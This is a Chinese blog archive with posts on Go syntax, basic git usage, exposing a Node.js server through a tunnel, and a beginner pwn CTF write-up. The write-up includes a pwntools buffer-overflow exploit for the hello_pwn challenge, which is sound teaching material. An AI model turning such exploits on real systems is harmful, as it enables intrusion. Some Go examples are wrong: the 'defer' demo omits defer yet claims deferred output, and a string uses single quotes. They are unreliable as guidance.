<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main<span class="comment">//main包表示一个可以执行的程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> fm <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fm.Println(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><ul>
<li>main包必须包含main函数，main函数没有参数也没有返回类型，<strong>函数的左大括号不能换行，否则报错</strong></li>
</ul>
<h3 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//var name type=value</span></span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span>=<span class="number">3</span></span><br></pre></td></tr></table></figure>
<h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>定义格式：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> identifier [<span class="keyword">type</span>] = value</span><br><span class="line"><span class="keyword">const</span> Pi=<span class="number">3.14159</span></span><br></pre></td></tr></table></figure>
<p>type可以省略，这样就交给编译器自行判断，数字型的常量是没有大小和符号的，并且可以使用任何精度而不会导致溢出（好耶）</p>
<h3 id="和"><a href="#和" class="headerlink" title=":=和="></a>:=和=</h3><p>这两个都可以用来初始化变量，前者让编译器自动通过变量数值来判断变量类型，后者直接让变量值赋值给左侧变量，要注意的是<strong>前者不能作用于已经初始化后的变量</strong>，后者可以。go语言中可以并行或同时赋值，</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">a,b,c:=<span class="number">3</span>,<span class="number">5</span>,<span class="string">&#x27;abc&#x27;</span></span><br></pre></td></tr></table></figure>
<p>如果想交换变量的值，可以像python一样：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">a,b=b,a</span><br></pre></td></tr></table></figure>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>声明的格式是：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> identifier <span class="keyword">type</span></span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span></span><br></pre></td></tr></table></figure>
<p>可以让声明和赋值一起来：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> identifier [<span class="keyword">type</span>] = value</span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span> = <span class="number">15</span></span><br><span class="line"><span class="keyword">var</span> i = <span class="number">5</span></span><br><span class="line"><span class="keyword">var</span> b <span class="type">bool</span> = <span class="literal">false</span></span><br><span class="line"><span class="keyword">var</span> str <span class="type">string</span> = <span class="string">&quot;Go says hello to the world!&quot;</span></span><br></pre></td></tr></table></figure>
<p>或者让编译器自己判断类型</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">15</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="literal">false</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;Go says hello to the world!&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><h4 id="前缀和后缀"><a href="#前缀和后缀" class="headerlink" title="前缀和后缀"></a>前缀和后缀</h4><p>strings包中包含一些常见操作：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">strings.HasPrefix(s, prefix <span class="type">string</span>) <span class="type">bool</span><span class="comment">//查看是否以该前缀开头，返回布尔值</span></span><br><span class="line">strings.HasSuffix(s, suffix <span class="type">string</span>) <span class="type">bool</span><span class="comment">//是否具有该后缀</span></span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;strings&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	var str string = &quot;This is an example of a string&quot;</span><br><span class="line">	fmt.Printf(&quot;T/F? Does the string \&quot;%s\&quot; have prefix %s? &quot;, str, &quot;Th&quot;)</span><br><span class="line">	fmt.Printf(&quot;%t\n&quot;, strings.HasPrefix(str, &quot;Th&quot;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="包含"><a href="#包含" class="headerlink" title="包含"></a>包含</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">strings.Contains(s, substr <span class="type">string</span>) <span class="type">bool</span><span class="comment">//判断s是否包含字串substr</span></span><br></pre></td></tr></table></figure>
<h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><p>返回字符串str在父串s中的索引</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">strings.Index(s, str <span class="type">string</span>) <span class="type">int</span></span><br><span class="line">strings.LastIndex(s, str <span class="type">string</span>) <span class="type">int</span><span class="comment">//返回最后一次出现位置的索引</span></span><br></pre></td></tr></table></figure>
<h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><p><code>Replace()</code> 用于将字符串 <code>str</code> 中的前 <code>n</code> 个字符串 <code>old</code> 替换为字符串 <code>new</code>，并返回一个新的字符串，如果 <code>n = -1</code> 或n大于字串的个数则替换所有字符串 <code>old</code> 为字符串 <code>new</code>：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">strings.Replace(str, old, <span class="built_in">new</span> <span class="type">string</span>, n <span class="type">int</span>) <span class="type">string</span></span><br></pre></td></tr></table></figure>
<h4 id="统计次数"><a href="#统计次数" class="headerlink" title="统计次数"></a>统计次数</h4><p>统计字符串str在字符串s中出现的非重叠次数</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">strings.Count(s, str <span class="type">string</span>) <span class="type">int</span></span><br></pre></td></tr></table></figure>
<h4 id="重复字符串"><a href="#重复字符串" class="headerlink" title="重复字符串"></a>重复字符串</h4><p>将字符串s重复count次</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">strings.Repeat(s,count <span class="type">int</span>) <span class="type">string</span></span><br></pre></td></tr></table></figure>
<h4 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">strings.ToLower(s) <span class="type">string</span><span class="comment">//变小写</span></span><br><span class="line">strings.ToUpper(s) <span class="type">string</span><span class="comment">//将字符串变大写</span></span><br></pre></td></tr></table></figure>
<h4 id="修剪"><a href="#修剪" class="headerlink" title="修剪"></a>修剪</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">strings.TrimSpace(s)<span class="comment">//剔除字符串开头和结尾的空白符号</span></span><br><span class="line">strings.Trim(s,<span class="string">&quot;cut&quot;</span>)<span class="comment">//剔除指定字符，剔除的位置是开头和结尾</span></span><br></pre></td></tr></table></figure>
<p>如果要指定左边或者右边，用TrimLeft()和TrimRight()</p>
<h4 id="分割"><a href="#分割" class="headerlink" title="分割"></a>分割</h4><p>这里注意返回的是slice</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">strings.Split(s, sep)<span class="comment">//自定义分割符号分割字符串</span></span><br></pre></td></tr></table></figure>
<h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">strings.Join(sl []<span class="type">string</span>, sep <span class="type">string</span>) <span class="type">string</span></span><br></pre></td></tr></table></figure>
<h3 id="时间和日期"><a href="#时间和日期" class="headerlink" title="时间和日期"></a>时间和日期</h3><p>示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> week time.Duration</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	t := time.Now()</span><br><span class="line">	fmt.Println(t) <span class="comment">// e.g. Wed Dec 21 09:52:14 +0100 RST 2011</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%02d.%02d.%4d\n&quot;</span>, t.Day(), t.Month(), t.Year())</span><br><span class="line">	<span class="comment">// 21.12.2011</span></span><br><span class="line">	t = time.Now().UTC()</span><br><span class="line">	fmt.Println(t) <span class="comment">// Wed Dec 21 08:52:14 +0000 UTC 2011</span></span><br><span class="line">	fmt.Println(time.Now()) <span class="comment">// Wed Dec 21 09:52:14 +0100 RST 2011</span></span><br><span class="line">	<span class="comment">// calculating times:</span></span><br><span class="line">	week = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span> * <span class="number">1e9</span> <span class="comment">// must be in nanosec</span></span><br><span class="line">	week_from_now := t.Add(time.Duration(week))</span><br><span class="line">	fmt.Println(week_from_now) <span class="comment">// Wed Dec 28 08:52:14 +0000 UTC 2011</span></span><br><span class="line">	<span class="comment">// formatting times:</span></span><br><span class="line">	fmt.Println(t.Format(time.RFC822)) <span class="comment">// 21 Dec 11 0852 UTC</span></span><br><span class="line">	fmt.Println(t.Format(time.ANSIC)) <span class="comment">// Wed Dec 21 08:56:34 2011</span></span><br><span class="line">	<span class="comment">// The time must be 2006-01-02 15:04:05</span></span><br><span class="line">	fmt.Println(t.Format(<span class="string">&quot;02 Jan 2006 15:04&quot;</span>)) <span class="comment">// 21 Dec 2011 08:52</span></span><br><span class="line">	s := t.Format(<span class="string">&quot;20060102&quot;</span>)</span><br><span class="line">	fmt.Println(t, <span class="string">&quot;=&gt;&quot;</span>, s)</span><br><span class="line">	<span class="comment">// Wed Dec 21 08:52:14 +0000 UTC 2011 =&gt; 20111221</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="带多个返回值的函数错误测试"><a href="#带多个返回值的函数错误测试" class="headerlink" title="带多个返回值的函数错误测试"></a>带多个返回值的函数错误测试</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">value, err := pack1.Function1(param1)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;An error occured in pack1.Function1 with parameter %v&quot;</span>, param1)</span><br><span class="line">	<span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 未发生错误，继续执行：</span></span><br></pre></td></tr></table></figure>
<h3 id="switch结构"><a href="#switch结构" class="headerlink" title="switch结构"></a>switch结构</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> i &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// 空分支，只有当 i == 0 时才会进入分支</span></span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		f() <span class="comment">// 当 i == 0 时函数不会被调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> i &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">fallthrough</span></span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		f() <span class="comment">// 当 i == 0 时函数也会被调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>fallthrough允许在执行case后继续往后执行，此时无论是否符合匹配条件都会执行</p>
<h3 id="for-range结构"><a href="#for-range结构" class="headerlink" title="for range结构"></a>for range结构</h3><p>用来遍历，对象可以是对象或者数组</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ages := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;</span><br><span class="line">    <span class="string">&quot;John&quot;</span>:  <span class="number">25</span>,</span><br><span class="line">    <span class="string">&quot;Alice&quot;</span>: <span class="number">30</span>,</span><br><span class="line">    <span class="string">&quot;Bob&quot;</span>:   <span class="number">35</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> ages &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Name:&quot;</span>, key, <span class="string">&quot;Age:&quot;</span>, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="标签和goto"><a href="#标签和goto" class="headerlink" title="标签和goto"></a>标签和goto</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	i:=<span class="number">0</span></span><br><span class="line">	HERE:<span class="comment">//全部用大写</span></span><br><span class="line">		<span class="built_in">print</span>(i)</span><br><span class="line">		i++</span><br><span class="line">		<span class="keyword">if</span> i==<span class="number">5</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">goto</span> HERE</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="传递变长参数"><a href="#传递变长参数" class="headerlink" title="传递变长参数"></a>传递变长参数</h4><p>使用方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myFunc</span><span class="params">(a, b, arg ...<span class="type">int</span>)</span></span> &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>实例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Greeting</span><span class="params">(prefix <span class="type">string</span>, who ...<span class="type">string</span>)</span></span></span><br><span class="line">Greeting(<span class="string">&quot;hello:&quot;</span>, <span class="string">&quot;Joe&quot;</span>, <span class="string">&quot;Anna&quot;</span>, <span class="string">&quot;Eileen&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="defer关键字"><a href="#defer关键字" class="headerlink" title="defer关键字"></a>defer关键字</h4><p><code>defer</code> 是 Go 语言中的关键字，用于延迟（defer）执行一个函数调用。当使用 <code>defer</code> 语句时，它会将函数调用推迟到所在函数返回之前执行。</p>
<p><code>defer</code> 的主要用途包括：</p>
<ol>
<li>延迟关闭资源：当你需要在函数执行完成后关闭打开的文件、数据库连接或网络连接等资源时，可以使用 <code>defer</code> 来确保在函数返回之前进行关闭操作，避免资源泄漏。</li>
<li>错误处理：当你需要在函数返回前进行一些清理操作，或者记录函数的结束状态时，可以使用 <code>defer</code> 来执行这些操作。例如，在函数中发生错误时，你可以在 <code>defer</code> 中记录错误日志。</li>
<li>代码简化：在某些情况下，使用 <code>defer</code> 可以简化代码逻辑。例如，在函数中进行加锁和解锁操作时，可以使用 <code>defer</code> 来确保在函数退出时正确释放锁，避免忘记解锁的问题。</li>
</ol>
<p><code>defer</code> 语句的执行顺序是“后进先出”（Last In, First Out）的顺序。也就是说，最后一个使用 <code>defer</code> 的函数调用会最先执行，而第一个使用 <code>defer</code> 的函数调用会最后执行。</p>
<p>例子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	function1()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">function1</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;In function1 at the top\n&quot;</span>)</span><br><span class="line">	function2()</span><br><span class="line">	fmt.Printf(<span class="string">&quot;In function1 at the bottom!\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">function2</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Function2: Deferred until the end of the calling function!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In function1 at the top</span><br><span class="line">In function1 at the bottom!</span><br><span class="line">Function2: Deferred until the end of the calling function!</span><br></pre></td></tr></table></figure>
<p>如果没有defer那么就没有第二行</p>
<h4 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h4><div class="table-container">
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>close()</code></td>
<td>用于管道通信</td>
</tr>
<tr>
<td><code>len()</code>、<code>cap()</code></td>
<td><code>len()</code> 用于返回某个类型的长度或数量（字符串、数组、切片、<code>map</code> 和管道）；<code>cap()</code> 是容量的意思，用于返回某个类型的最大容量（只能用于数组、切片和管道，不能用于 <code>map</code>）</td>
</tr>
<tr>
<td><code>new()</code>、<code>make()</code></td>
<td><code>new()</code> 和 <code>make()</code> 均是用于分配内存：<code>new()</code> 用于值类型和用户定义的类型，如自定义结构，<code>make</code> 用于内置引用类型（切片、<code>map</code> 和管道）。它们的用法就像是函数，但是将类型作为参数：<code>new(type)</code>、<code>make(type)</code>。<code>new(T)</code> 分配类型 <code>T</code> 的零值并返回其地址，也就是指向类型 <code>T</code> 的指针。它也可以被用于基本类型：<code>v := new(int)</code>。<code>make(T)</code> 返回类型 <code>T</code> 的初始化之后的值，因此它比 <code>new()</code> 进行更多的工作。<strong><code>new()</code> 是一个函数，不要忘记它的括号</strong>。</td>
</tr>
<tr>
<td><code>copy()</code>、<code>append()</code></td>
<td>用于复制和连接切片</td>
</tr>
<tr>
<td><code>panic()</code>、<code>recover()</code></td>
<td>两者均用于错误处理机制</td>
</tr>
<tr>
<td><code>print()</code>、<code>println()</code></td>
<td>底层打印函数，在部署环境中建议使用 <code>fmt</code> 包</td>
</tr>
<tr>
<td><code>complex()</code>、<code>real ()</code>、<code>imag()</code></td>
<td>用于创建和操作复数</td>
</tr>
</tbody>
</table>
</div>
<h4 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h4><p>go的回调例子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	callback(<span class="number">1</span>, Add)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span><span class="params">(a, b <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;The sum of %d and %d is: %d\n&quot;</span>, a, b, a+b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">callback</span><span class="params">(y <span class="type">int</span>, f <span class="keyword">func</span>(<span class="type">int</span>, <span class="type">int</span>)</span></span>) &#123;</span><br><span class="line">	f(y, <span class="number">2</span>) <span class="comment">// this becomes Add(1, 2)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The sum of 1 and 2 is: 3</span><br></pre></td></tr></table></figure>
<h4 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	f()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">4</span>; i++ &#123;</span><br><span class="line">		g := <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123; fmt.Printf(<span class="string">&quot;%d &quot;</span>, i) &#125;</span><br><span class="line">		g(i)</span><br><span class="line">		fmt.Printf(<span class="string">&quot; - g is of type %T and has value %v\n&quot;</span>, g, g)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>语言语法</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>go语言</tag>
      </tags>
  </entry>
  <entry>
    <title>git的基本用法</title>
    <url>/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p> git命令行的基本用法：</p>
<span id="more"></span>
<h2 id="用法定义"><a href="#用法定义" class="headerlink" title="用法定义"></a>用法定义</h2><p>用法定义网上一找一大把，实在不行看csdn都行，就不赘述了</p>
<h2 id="用法例子"><a href="#用法例子" class="headerlink" title="用法例子"></a>用法例子</h2><p>这样子说话还是太抽象了，从实际情况出发举个例子来说明吧（ 这里我们从头开始新建仓库，对仓库进行修改并提交</p>
<p>首先新建仓库，直接在GitHub建：</p>
<p><img src="https://s2.loli.net/2023/07/20/luQ1F5yfnqDwZrG.png" alt="仓库.png"></p>
<p>这个时候创建了一个远程的空仓库，但是本地还没有这么一个文件夹，所以要<strong>git clone</strong>：</p>
<p><img src="https://s2.loli.net/2023/07/20/4DgZmCHd2WQ9obB.png" alt="clone.png"></p>
<p>这样这个叫testProject的仓库就拷贝到我们的本地了，接下来就是要看看分支的问题：</p>
<p><img src="https://s2.loli.net/2023/07/20/abPhGy48vMOTNtk.png" alt="分支.png"></p>
<p>首先第一条指令看出来本地只有一个分支，叫main，红色的是远程分支，这里看到也是main。<strong>git remote</strong> 可以查看本地仓库是否连接到远程仓库，这里可以看出来我是连接上的。当然我们写项目不可能只用一个分支，因此在本地新建分支是必须的。使用<strong>git branch</strong> 指令新建分支再用<strong>git checkout</strong>转换到新的分支</p>
<p><img src="https://s2.loli.net/2023/07/20/Cm8drtefEJMRlP5.png" alt="创建_转移分支.png"></p>
<p>搞清楚分支的概念之后，我们就可以新建文件往里面塞东西了，先塞个文件</p>
<p><img src="https://s2.loli.net/2023/07/20/18NydCF6ulkL7mc.png" alt="新建文件内容.png"></p>
<p>保存后我们来看本地仓库的变化：</p>
<p><img src="https://s2.loli.net/2023/07/20/vRgLoy1cXrQC4Z9.png" alt="commit.png"></p>
<p>status查询变化，发现有一个新的文件，但是是红色的，说明没有在本地记录下来，使用命令<strong>git add .</strong>可以把文件记录到变化中，可以看到文件名字变成绿色的了，随后使用commit将这个新的文件提交到本地仓库中，<strong>git log</strong>打印日志可以看到本地仓库的变化，至此本地仓库全部部署完毕，接下来是远程仓库的更新，使用命令<strong>git push origin &lt;分支名&gt;</strong>就可以提交到远程仓库</p>
<p><img src="https://s2.loli.net/2023/07/20/nJ3WLFbX89gc2dD.png" alt="push到远程.png"></p>
<p>这个时候回到GitHub刷新，就可以看到我们提交上去的内容了。</p>
<p><img src="https://s2.loli.net/2023/07/20/ngzprFySe8l5E6c.png" alt="远程更新完毕.png"></p>
<p>到这里管理一个属于自己的项目基本上是结束了，还是很简单的，因为只要不涉及多人合作，自己打理自己的一亩三分地还是很ez的，也没有什么奇奇怪怪的bug，有的话，重新提交不就好了(</p>
]]></content>
      <categories>
        <category>乱七八糟玩意</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>瞎折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs搭建本地服务器并允许外网访问</title>
    <url>/2023/04/16/nodejs%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E5%85%81%E8%AE%B8%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇博客记录一下搭建本地服务器并允许外网访问的过程，原因是在前端开发中常常需要向服务器发送请求来动态获取展示数据，然后我就想能不能自己定义返回的东西，但是问题是云服务器有一、、贵 (  所以就想着自己搭一个。</p>
<p>因为之前搭过本地的，用nodejs能做一个轻量级的服务器，很快，因此这次就想着怎么让别人能访问到，当然首先就是搭一个本地服务器。</p>
<h2 id="搭建本地服务器"><a href="#搭建本地服务器" class="headerlink" title="搭建本地服务器"></a>搭建本地服务器</h2><p>首先是常规npm init初始化得到一个package.json文件，然后安装express模块，安装完后新建index.js文件输入基本配置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;hello my fucking friend&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/signIn&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/index.html&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3030</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Example app listening on port 3030!&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这样就配置好了一个最基本的服务器了，命令行npm start就可以让它运行起来</p>
<h2 id="允许外部访问"><a href="#允许外部访问" class="headerlink" title="允许外部访问"></a>允许外部访问</h2><p>这个有些复杂，用到一个叫内网穿透的方法。ai解释是：<strong>内网穿透是一种将本地网络中的设备暴露在公网上的技术，使得在公网上的计算机可以通过互联网连接到内网中的设备，就像这些设备直接连接在公网上一样。内网穿透的实现通常需要使用一个中间服务器或者代理服务器，将公网的请求转发到内网中的设备上，从而实现内网设备和公网的连接。</strong></p>
<p>那就要用到内网穿透工具，工具很多，上网找一个就行，我这里是用的natapp，首先做好natapp内的配置，把自己的二级域名绑定上去，这样绑定后就能将本地的ip+端口和你的二级域名划上等号了，也就是说访问二级域名就能访问到你的本地ip了，这就叫穿透（？这样启动natapp的时候就能看到这个：</p>
<p>至此，就允许外部访问本地服务器了，好耶（</p>
]]></content>
      <categories>
        <category>项目开发</category>
        <category>乱七八糟玩意</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>瞎折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn:从一窍不通到入门的门前</title>
    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
    <content><![CDATA[<p> 基础pwn例题，栈溢出，格式化字符串。</p>
<span id="more"></span>
<h3 id="栈溢出例题"><a href="#栈溢出例题" class="headerlink" title="栈溢出例题"></a>栈溢出例题</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>来源：攻防世界</p>
<p>首先先checksec：</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/6b2f7f0eaed1bfad.png" alt=""></p>
<p>再看伪代码：</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/29fb51325ccdec9c.png" alt=""></p>
<p>再看偏移量：</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/904b3c8adc42b597.png" alt=""></p>
<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>来源：攻防世界</p>
<p>checksec:</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/70c82b33e6850c2c.png" alt=""></p>
<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
